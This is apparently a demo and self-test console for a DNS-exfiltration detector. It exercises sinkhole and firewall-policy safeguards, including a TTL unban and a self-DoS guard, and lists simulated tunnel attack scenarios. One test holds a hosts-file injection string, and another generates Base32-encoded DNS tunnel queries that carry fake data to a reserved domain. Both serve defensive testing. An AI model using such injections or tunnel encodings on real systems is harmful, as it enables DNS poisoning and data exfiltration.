            "3 x HIGH, domain_signal=True, on *.convict.example:",
            f"  1st -> {res[0]}    2nd -> {res[1]}    3rd -> {res[2]}"
            "   (convicted)",
            f"is_sunk('s2.convict.example') = {seen}",
            f"is_sunk('s4.convict.example') = {unseen}   ← never queried, "
            "sinks on sight",
            f"hosts entries: {sh.blocked_domains()}",
        ]
    finally:
        _rmtree(d)


@mit_check("sinkhole-popular", "DomainSinkhole — popular infrastructure",
           "Tranco/built-in domains are refused even with CONFIRMED evidence, "
           "so a false positive cannot take browsing down", group="sinkhole")
def _mit_sink_popular():
    from exfiltrap import reputation
    from exfiltrap.mitigation import DomainSinkhole

    d, hp = _tmp_hosts()
    try:
        sh = DomainSinkhole(hosts_path=hp, ttl=3600.0, clock=_Clock(), strikes=3)
        target = "www.google.com"
        pop = reputation.is_popular(target)
        r = sh.notify(_assess("CONFIRMED", qname=target,
                              confirmed_exfiltration=True))
        txt = _read_text(hp)
        ok = (r is False and sh.is_sunk(target) is False and not txt.strip())
        return ok, [
            f"reputation corpus: {reputation.corpus_size()} domains",
            f"is_popular({target!r}) = {pop}",
            f"notify(CONFIRMED) -> {r}    is_sunk -> {sh.is_sunk(target)}",
            f"hosts file: {txt!r}",
        ]
    finally:
        _rmtree(d)


@mit_check("sinkhole-injection", "DomainSinkhole — hosts-file injection",
           "a qname carrying whitespace or newlines is refused: nothing but "
           "[A-Za-z0-9._-] can ever reach the hosts file", group="sinkhole")
def _mit_sink_injection():
    from exfiltrap.mitigation import DomainSinkhole

    d, hp = _tmp_hosts()
    try:
        sh = DomainSinkhole(hosts_path=hp, ttl=3600.0, clock=_Clock(), strikes=3)
        evil = "evil.example\n0.0.0.0 bank.example"
        r = sh.notify(_assess("CONFIRMED", qname=evil,
                              confirmed_exfiltration=True))
        txt = _read_text(hp)
        ok = r is False and "bank.example" not in txt
        return ok, [
            f"qname = {evil!r}",
            f"notify -> {r}",
            f"hosts file: {txt!r}",
            "→ refused by the qname regex before any write is attempted.",
        ]
    finally:
        _rmtree(d)


@mit_check("sinkhole-ttl", "DomainSinkhole — the TTL reaper",
           "every managed entry expires: after the TTL the hosts file is "
           "clean again, so a crashed engine cannot poison it forever",
           group="sinkhole")
def _mit_sink_ttl():
    from exfiltrap.mitigation import DomainSinkhole

    d, hp = _tmp_hosts()
    try:
        ck = _Clock()
        sh = DomainSinkhole(hosts_path=hp, ttl=60.0, clock=ck, strikes=3)
        sh.notify(_assess("CONFIRMED", qname="drip.tunnel.example",
                          confirmed_exfiltration=True))
        written = len(_read_text(hp).splitlines())
        ck.advance(61)
        freed = sh.reap_expired()
        after = _read_text(hp)
        ok = (bool(freed) and "exfiltrap-managed" not in after
              and not after.strip())
        return ok, [
            f"entries written: {written} lines (TTL 60s)",
            "clock advanced 61s",
            f"reap_expired() freed: {freed}",
            f"hosts file after: {after!r}",
        ]
    finally:
        _rmtree(d)


# --------------------------------------------------------------- block policy
@mit_check("policy-allowlist", "PolicyMitigation — the allowlist",
           "an allowlisted source is never blocked, and removing it from the "
           "allowlist restores blocking", group="policy")
def _mit_policy_allowlist():
    from exfiltrap.mitigation import LogOnlyMitigation
    from exfiltrap.policy import PolicyMitigation

    inner = LogOnlyMitigation()
    p = PolicyMitigation(inner, allowlist=("203.0.113.9",))
    while_allowed = p.block_ip("203.0.113.9")
    inner_blocked = inner.is_blocked("203.0.113.9")
    p.allowlist_remove("203.0.113.9")
    after = p.block_ip("203.0.113.9")
    ok = (while_allowed is False and inner_blocked is False and after is True)
    return ok, [
        "allowlist = ('203.0.113.9',)",
        f"block_ip -> {while_allowed}    inner.is_blocked -> {inner_blocked}",
        f"allowlist_remove() then block_ip -> {after}",
        "→ your resolver, a DC, the CTO's laptop: vouched for, live.",
    ]


@mit_check("policy-selfdos", "PolicyMitigation — the self-DoS guard",
           "HIGH/CONFIRMED from the host's OWN address is never firewalled "
           "(that cuts the operator's own DNS); it defers, and says why",
           group="policy")
def _mit_policy_selfdos():
    from exfiltrap.mitigation import LogOnlyMitigation
    from exfiltrap.policy import PolicyMitigation

    inner = LogOnlyMitigation()
    p = PolicyMitigation(inner, own_ips=("198.51.100.5",))
    own = p.notify(_assess("HIGH", ip="198.51.100.5"))
    loop = p.notify(_assess("CONFIRMED", ip="127.0.0.1"))
    ok = (own is False and loop is False and p.last_response == "deferred"
          and inner.is_blocked("198.51.100.5") is False
          and inner.is_blocked("127.0.0.1") is False)
    return ok, [
        "own_ips = ('198.51.100.5',)  — and 127.0.0.1 is own by definition",
        f"notify(HIGH from 198.51.100.5) -> {own}",
        f"notify(CONFIRMED from 127.0.0.1) -> {loop}",
        f"last_response = {p.last_response!r}   "
        f"last_target = {p.last_target!r}",
        f"last_defer_reason = {p.last_defer_reason!r}",
        f"inner.is_blocked(...) = "
        f"{inner.is_blocked('198.51.100.5')}, {inner.is_blocked('127.0.0.1')}",
    ]


@mit_check("policy-domain-response", "PolicyMitigation — acting on the right thing",
           "with a sinkhole attached, an own-host CONFIRMED verdict produces a "
           "DOMAIN response instead of a source block", group="policy")
def _mit_policy_domain():
    from exfiltrap.mitigation import DomainSinkhole, LogOnlyMitigation
    from exfiltrap.policy import PolicyMitigation

    d, hp = _tmp_hosts()
    try:
        inner = LogOnlyMitigation()
        sh = DomainSinkhole(hosts_path=hp, ttl=3600.0, clock=_Clock(), strikes=3)
        p = PolicyMitigation(inner, own_ips=("198.51.100.5",), sinkhole=sh)
        r = p.notify(_assess("CONFIRMED", ip="198.51.100.5",
                             qname="c2.tunnel.example",
                             confirmed_exfiltration=True))
        ok = (r is True and p.last_response == "domain"
              and p.last_target == "c2.tunnel.example"
              and sh.is_sunk("c2.tunnel.example")
              and inner.is_blocked("198.51.100.5") is False)
        return ok, [
            f"notify(CONFIRMED from own IP) -> {r}",
            f"last_response = {p.last_response!r}   "
            f"last_target = {p.last_target!r}",
            f"sinkhole is_sunk('c2.tunnel.example') = "
            f"{sh.is_sunk('c2.tunnel.example')}",
            f"source firewall touched? {inner.is_blocked('198.51.100.5')} "
            "(must be False)",
        ]
    finally:
        _rmtree(d)


@mit_check("policy-ttl", "PolicyMitigation — TTL auto-unban",
           "a block past its TTL is reversed automatically: a detector that "
           "blocks and never unblocks is an outage waiting for its first "
           "false positive", group="policy")
def _mit_policy_ttl():
    from exfiltrap.mitigation import LogOnlyMitigation
    from exfiltrap.policy import PolicyMitigation

    ck = _Clock()
    inner = LogOnlyMitigation()
    p = PolicyMitigation(inner, block_ttl=60.0, clock=ck)
    p.block_ip("203.0.113.9")
    blocked = inner.is_blocked("203.0.113.9")
    ck.advance(30)
    mid = p.reap_expired()
    still = inner.is_blocked("203.0.113.9")
    ck.advance(31)
    freed = p.reap_expired()
    ok = (blocked is True and mid == [] and still is True
          and freed == ["203.0.113.9"]
          and inner.is_blocked("203.0.113.9") is False)
    return ok, [
        "block_ttl = 60s",
        f"blocked -> {blocked}",
        f"t+30s  reap_expired() -> {mid} (nothing yet)   "
        f"still blocked = {still}",
        f"t+61s  reap_expired() -> {freed}   blocked now = "
        f"{inner.is_blocked('203.0.113.9')}",
    ]


@mit_check("policy-unblock", "PolicyMitigation — the manual reversal",
           "the dashboard's unblock button reverses both a source block and a "
           "sunk domain", group="policy")
def _mit_policy_unblock():
    from exfiltrap.mitigation import DomainSinkhole, LogOnlyMitigation
    from exfiltrap.policy import PolicyMitigation

    d, hp = _tmp_hosts()
    try:
        inner = LogOnlyMitigation()
        sh = DomainSinkhole(hosts_path=hp, ttl=3600.0, clock=_Clock(), strikes=3)
        p = PolicyMitigation(inner, sinkhole=sh)
        p.block_ip("203.0.113.9")
        src_ok = p.unblock("203.0.113.9")
        src_after = inner.is_blocked("203.0.113.9")
        sh.notify(_assess("CONFIRMED", qname="kill.tunnel.example",
                          confirmed_exfiltration=True))
        dom_before = sh.is_sunk("kill.tunnel.example")
        dom_ok = p.unblock("kill.tunnel.example")
        dom_after = sh.is_sunk("kill.tunnel.example")
        ok = (src_ok and not src_after and dom_before and dom_ok
              and not dom_after)
        return ok, [
            f"source: unblock -> {src_ok}   is_blocked now = {src_after}",
            f"domain: sunk before = {dom_before}   unblock -> {dom_ok}   "
            f"is_sunk now = {dom_after}",
            f"hosts file: {_read_text(hp)!r}",
        ]
    finally:
        _rmtree(d)


# ------------------------------------------------------------- full chain
@mit_check("e2e", "End-to-end — detection to response, one chain",
           "a real pipeline (RF model + stateful layers) over a synthetic "
           "Base32 tunnel stream reaches CONFIRMED, and the policy ledger "
           "records the block with its target — M1..M9 in one run",
           group="chain")
def _mit_e2e():
    import collections

    from exfiltrap.events import DNSQuery
    from exfiltrap.mitigation import LogOnlyMitigation
    from exfiltrap.pipeline import ExfilTrapPipeline
    from exfiltrap.policy import PolicyMitigation

    ledger = _Ledger()
    policy = PolicyMitigation(LogOnlyMitigation(), block_ttl=3600.0)
    pipe = ExfilTrapPipeline(mitigation=policy, storage=ledger)

    attacker = "203.0.113.66"
    zone = "tunnel.example"
    qs = []
    for i in range(24):
        enc = base64.b32encode(
            b"QUARTERLY-RESULTS-XLSX " + bytes([i]) * 2).decode().rstrip("=")
        qname = ".".join(enc[j:j + 50]
                         for j in range(0, len(enc), 50)) + "." + zone
        qs.append(DNSQuery(src_ip=attacker, qname=qname,
                           timestamp=1000.0 + i * 0.4))
    results = pipe.run_synthetic(qs)
    levels = collections.Counter(a.risk_level for a in results)
    confirmed = [a for a in results if a.confirmed_exfiltration]
    acted = [b for b in ledger.blocks if b["target"] == attacker]
    ok = bool(confirmed) and bool(acted)
    return ok, [
        f"{len(qs)} synthetic Base32 tunnel queries from {attacker} via "
        f"{zone}",
        f"verdicts: {dict(levels)}",
        f"decoded payloads: {len(confirmed)}"
        + (f"   e.g. {confirmed[0].decoded_preview}" if confirmed else ""),
        f"response ledger: {[(b['target'], b['level'], b.get('kind')) for b in ledger.blocks]}",
        f"→ detection reached CONFIRMED and the response layer acted on "
        f"{attacker} ({len(acted)} block record(s))",
    ]


# --------------------------------------------------------------- the runner
MIT_LAUNCH = {
    "log": "python3 -m exfiltrap.service --mitigation log",
    "iptables (dry-run)": "python3 -m exfiltrap.service --mitigation iptables",
    "iptables (live, isolated ns only)":
        "python3 -m exfiltrap.service --mitigation iptables --execute",
    "netsh (Windows service)":
        "python3 -m exfiltrap.service --mitigation netsh --execute",
    "sinkhole armed":
        "python3 -m exfiltrap.service --sinkhole --sinkhole-strikes 3",
}


def run_mitigation_tests(only=None) -> int:
    """Drive every mitigation backend for real, and print the evidence."""
    sel = [c for c in MIT_CHECKS if not only or c["key"] in only]
    if not sel:
        print("  no such mitigation check")
        return 2
    print()
    print("╔" + "═" * 66 + "╗")
    print("║   MITIGATION SELF-TEST — the response half, driven for real"
          "      ║")
    print("╚" + "═" * 66 + "╝")
    print("  The shipped classes, real RiskAssessment objects, dry-run "
          "defaults.")
    print("  No root, no firewall change, no running engine needed.")
    print()
    passed = failed = 0
    for i, c in enumerate(sel, 1):
        try:
            ok, ev = c["run"]()
        except ModuleNotFoundError as exc:
            ok, ev = False, [
                f"ERROR missing dependency: {exc.name}",
                "-> this interpreter cannot import the project's deps. Use the "
                "venv: .venv-build/bin/python, or recreate .venv (README).",
            ]
        except Exception as exc:  # noqa: BLE001 — a broken check is a FAIL
            ok, ev = False, [f"ERROR {type(exc).__name__}: {exc}"]
        if ok:
            passed += 1
        else:
            failed += 1
        mark = "PASS" if ok else "FAIL"
        print(f"  [{mark}] {i:2d}/{len(sel)}  {c['key']}")
        print(f"          {c['title']}")
        print(f"          group : {c['group']}")
        print(f"          expect: {c['expect']}")
        for line in ev:
            print(f"          · {line}")
        print()
    print("  " + "─" * 66)
    print(f"  {passed} passed, {failed} failed   (of {len(sel)} checks)")
    if failed:
        print("  A FAIL here is the RESPONSE layer, not the detector.")
    print()
    print("  backend KIND is chosen when the engine starts, not at runtime.")
    print("  To run the engine with a different response backend:")
    for label, cmd in MIT_LAUNCH.items():
        print(f"    {label:34s} {cmd}")
    print("  The domain sinkhole IS runtime-switchable:")
    print("    python3 tools/demo_console.py --live-mitigation")
    return 1 if failed else 0


# ------------------------------------------------------- live sinkhole round
def live_mitigation(tunnel: str, up: str) -> None:
    """Arm the domain sinkhole, run a loud tunnel, read the response back
    from the engine, then disarm. The response half of the demo, live."""
    print()
    print("═" * 66)
    print("  LIVE MITIGATION — arm the sinkhole ▸ attack ▸ read the response")
    print("═" * 66)
    try:
        st = api("/api/status")
    except Exception as exc:
        print(f"  ⚠ engine API unreachable ({exc}). This scenario needs the "
              "running service — it owns the firewall, not this console.")
        return
    # The response config lives under "policy" (service mode only). A
    # standalone dashboard has no policy block at all: say so instead of
    # guessing, because guessing is what made this report "not armable" on
    # an engine that was armable.
    pol = st.get("policy") or {}
    if not pol:
        print("  ⚠ this engine exposes no response policy (standalone "
              "dashboard). Restart it in service mode:")
        print("      python3 -m exfiltrap.service --sinkhole")
        return
    cfg = {k: pol.get(k) for k in ("sinkhole", "sinkhole_strikes",
                                   "sinkhole_ttl", "self_dos_guard",
                                   "popularity_guard")}
    print(f"  engine response config : {cfg}")
    print(f"  own_ips (never firewalled) : {pol.get('own_ips')}")
    if not pol.get("sinkhole_armable"):
        print("  ⚠ this engine reports the sinkhole is NOT armable.")
        return
    armed_by_us = False
    if pol.get("sinkhole"):
        print("  sinkhole already armed — reusing it (it will be left as-is).")
    else:
        try:
            r = api_post("/api/sinkhole", {"enabled": True})
            armed_by_us = True
            print(f"  POST /api/sinkhole {{enabled:true}} -> "
                  f"enabled={r.get('enabled')}")
        except Exception as exc:
            print(f"  ⚠ could not arm the sinkhole: {exc}")
            return
    try:
        before = snap()
    except Exception:
        before = None
    sc = next(s for s in SCENARIOS if s["key"] == "smash_grab")
    run_scenario(sc, "high", tunnel, up)
    print()
    print("  ── response verdict (engine API) " + "─" * 32)
    try:
        body = api("/api/sinkhole")
        print(f"   sinkhole enabled  : {body.get('enabled')}")
        print(f"   sunk domains      : {body.get('domains')}")
        hits = body.get("hits") or []
        print(f"   interception hits : {len(hits)} (queries that still "
              "reached a cut channel)")
        for h in hits[:4]:
            print(f"     {h}")
        bl = api("/api/blocked").get("blocked", [])
        print(f"   response ledger   : {len(bl)} entry(ies)")
        for b in bl[:4]:
            print(f"     {b}")
        if body.get("domains"):
            print("   ✅ the response acted: the tunnel zone is answered "
                  "0.0.0.0 (channel cut) while everything else still "
                  "resolves — and hits keep climbing, so the attacker is "
                  "still trying.")
        else:
            print("   ⚠ nothing sunk yet. On a shared desktop the source is "
                  "your OWN machine, so the sink needs domain-level "
                  "evidence: a decoded payload on THAT hostname, or 3 HIGH "
                  "verdicts on the base domain (--sinkhole-strikes). Try "
                  "intensity high again.")
    except Exception as exc:
        print(f"   (could not read the response: {exc})")
    print("  ─" * 22)
    if not armed_by_us:
        print("  The sinkhole was already armed before this run, so it is "
              "left armed. Disarm it from the dashboard (System ▸ Sinkhole) "
              "or POST /api/sinkhole {enabled:false}.")
        return
    try:
        ans = input("  disarm now (removes every managed hosts entry)? "
                    "[Y/n] ").strip().lower()
    except (EOFError, KeyboardInterrupt):
        print()
        ans = "y"
    if ans in ("", "y", "yes"):
        try:
            c = api_post("/api/sinkhole", {"enabled": False})
            print(f"  disarmed -> enabled={c.get('enabled')}  "
                  f"domains={c.get('domains')}")
        except Exception as exc:
            print(f"  ⚠ disarm failed: {exc}")
            print(f'    retry: curl -s -X POST {API}/api/sinkhole '
                  f'-H "Content-Type: application/json" '
                  f'-d \'{{"enabled": false}}\'')
    else:
        print("  left armed — disarm from the dashboard (System ▸ Sinkhole) "
              "or POST /api/sinkhole {enabled:false}.")


# ---------------------------------------------------------------------- menu
MENU_ORDER = ["smash_grab", "ramp_up", "nested_enc", "slow_drip_hex",
              "glacial_drip", "phonotactic_stealth", "beacon_c2",
              "dns_sweep", "txt_exfil", "mixed_smoke", "scary_benign"]


def menu(tunnel: str, up: str) -> None:
    """Everything is number-driven: scenario number, then intensity number."""
    while True:
        print()
        print("╔" + "═" * 62 + "╗")
        print("║   ExFilTrap ATTACK + RESPONSE CONSOLE — enter a number   ║")
        print("╚" + "═" * 62 + "╝")
        for i, key in enumerate(MENU_ORDER, 1):
            sc = next(s for s in SCENARIOS if s["key"] == key)
            print(f"  {i:2d}  {sc['title']}")
        print("  12  Full demo story — 5 scripted acts (for presenting)")
        print("  13  MITIGATION SELF-TEST — every response backend, for real")
        print("  14  LIVE MITIGATION — arm sinkhole ▸ attack ▸ read response")
        print()
        print("   0  quit")
        try:
            choice = input("\nchoose attack [number]: ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return
        if choice in ("0", "q", "quit", "exit"):
            return
        if choice == "12":
            demo_story(tunnel, up)
            continue
        if choice in ("13", "m", "M"):
            run_mitigation_tests()
            try:
                input("\n  ⏎ Enter to return to the menu… ")
            except (EOFError, KeyboardInterrupt):
                print()
                return
            continue
        if choice in ("14", "l", "L"):
            live_mitigation(tunnel, up)
            try:
                input("\n  ⏎ Enter to return to the menu… ")
            except (EOFError, KeyboardInterrupt):
                print()
                return
            continue
        if not choice.isdigit() or not 1 <= int(choice) <= len(MENU_ORDER):
            print("  ? enter a number from the list (0 to quit)")
            continue
        sc = next(s for s in SCENARIOS if s["key"] == MENU_ORDER[int(choice) - 1])
        print(f"  → {sc['title']}")
        print("     intensity:  1) low   2) medium   3) high")
        try:
            ic = input("     choose intensity [number, Enter=1]: ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return
        it = {"1": "low", "2": "medium", "3": "high",
              "": "low"}.get(ic, "low")
        run_scenario(sc, it, tunnel, up)
        try:
            input("\n  ⏎ Enter to return to the menu (Ctrl-C quits)… ")
        except (EOFError, KeyboardInterrupt):
            print()
            return


# ---------------------------------------------------------------------- main
def main(argv=None) -> int:
    global API
    p = argparse.ArgumentParser(
        prog="demo_console",
        description="Attack + response simulator for live ExFilTrap demos "
                    "(real DNS, safe doc-domain payloads, real mitigation "
                    "backends driven offline).")
    p.add_argument("--list", action="store_true",
                   help="print the scenario catalogue and exit")
    p.add_argument("--scenario", choices=[s["key"] for s in SCENARIOS],
                   help="run one scenario non-interactively")
    p.add_argument("--intensity", choices=list(INTENSITY), default="low")
    p.add_argument("--story", action="store_true",
                   help="run the scripted 5-act demo story")
    p.add_argument("--tunnel", default=DEFAULT_TUNNEL,
                   help=f"attack zone label (default {DEFAULT_TUNNEL})")
    p.add_argument("--resolver", default=None,
                   help="DNS server to send to (default: auto-detect the "
                        "system upstream resolver; port is always 53)")
    p.add_argument("--api", default=API, help="engine API base URL")
    p.add_argument("--mitigations", action="store_true",
                   help="run the MITIGATION SELF-TEST — every response "
                        "backend, offline, no root needed — and exit")
    p.add_argument("--mitigation", choices=[c["key"] for c in MIT_CHECKS],
                   help="run ONE mitigation check and exit")
    p.add_argument("--live-mitigation", action="store_true",
                   help="arm the engine's domain sinkhole, run a loud tunnel, "
                        "read the response back from the API, then disarm")
    a = p.parse_args(argv)

    API = a.api

    if a.list:
        print(f"{'key':20s} {'title':38s} expect")
        print("─" * 100)
        for s in SCENARIOS:
            print(f"{s['key']:20s} {s['title']:38s} {s['expect'][:40]}")
        print()
        print("mitigation self-test checks (--mitigation <key>):")
        for c in MIT_CHECKS:
            print(f"  {c['key']:22s} [{c['group']:8s}] {c['title'][:44]}")
        return 0

    # The response half needs no engine, no resolver and no root — answer it
    # before the engine banner so the output stays clean and pipeable.
    if a.mitigations:
        return run_mitigation_tests()
    if a.mitigation:
        return run_mitigation_tests(only={a.mitigation})

    up = a.resolver or upstream_resolver()
    global UP_RESOLVER
    UP_RESOLVER = up
    info = engine_info()
    print(f"engine API : {API}")
    if info:
        up_s = info.get("uptime_s", 0)
        print(f"engine     : mode={info.get('mode')}  uptime={up_s:.0f}s  "
              f"root={info.get('is_root')}")
        if info.get("capture_healthy") is False:
            ifaces = info.get("capture_ifaces") or {}
            bad = ", ".join(name for name, v in ifaces.items()
                            if not v.get("ok")) or "unknown interface"
            print(f"  ⚠ CAPTURE DEGRADED on {bad} — attacks crossing that "
                  "link will NOT be detected. Restart the engine before "
                  "demoing (desktop ▸ Start).")
        if up_s < 300:
            print("  ⚠ engine baseline is still warming (<5 min uptime); "
                  "stateful detections sharpen with a few minutes of "
                  "normal traffic — run ACT 1 or 'scary_benign' first.")
    else:
        print("  ⚠ ENGINE NOT REACHABLE — traffic will still be sent on "
              "the wire, but verdicts need the service on 127.0.0.1:5050.")
    print(f"resolver   : {up}   attack zone: {a.tunnel}")
    print("(synthetic payloads only — tunnel.example is IETF-reserved; "
          "no real system is targeted)")

    if a.live_mitigation:
        live_mitigation(a.tunnel, up)
        return 0
    if a.scenario:
        sc = next(s for s in SCENARIOS if s["key"] == a.scenario)
        run_scenario(sc, a.intensity, a.tunnel, up)
        return 0
    if a.story:
        demo_story(a.tunnel, up)
        return 0
    menu(a.tunnel, up)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
